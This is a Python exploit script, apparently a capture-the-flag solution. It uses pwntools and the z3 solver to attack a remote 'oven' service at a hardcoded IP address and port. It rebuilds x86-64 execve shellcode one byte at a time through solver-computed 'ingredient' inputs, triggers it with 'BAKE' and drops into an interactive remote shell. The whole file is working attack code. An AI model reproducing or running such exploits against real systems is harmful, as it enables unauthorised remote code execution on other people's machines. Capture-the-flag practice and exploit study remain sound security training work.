#!/usr/bin/env python

from pwn import *
from z3 import *
import time, sys

shellcode = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"

def make_shellcode(ran, scb):
	ingredient = "SUGAR"
	for i in range(len(ingredient)):
		ran += ord(ingredient[i])
	if (ran & 0xFF) == ord(scb):
		return ingredient
	else:
		s = Solver()
		addition = BitVec('addition', 8)
		s.add((ran & 0xFF) + addition == ord(scb))
		if s.check() == sat:
			newChar = chr(s.model()[addition].as_long())
			return ingredient + newChar



#r = process(['./910abf341053d25831ecb465b7ddf738'])
r = remote('52.17.31.229', 31337)
time.sleep(3)
garbage = r.recvuntil('0v3n w4rm3d up to')
ran = int(r.recvline()[:-21]) / 0x1337

log.info("Random: " + hex(ran))
sys.stdout.write("[!] Working...")

for i in range(len(shellcode)):
	r.sendline(make_shellcode(ran, shellcode[i]))
	sys.stdout.write(str( int((float(i) / len(shellcode)) * 100)) + "%...")
	time.sleep(.5)
	garbage = r.recv(timeout=1)

r.sendline("BAKE")

garbage = r.recv(timeout=1)

r.interactive()
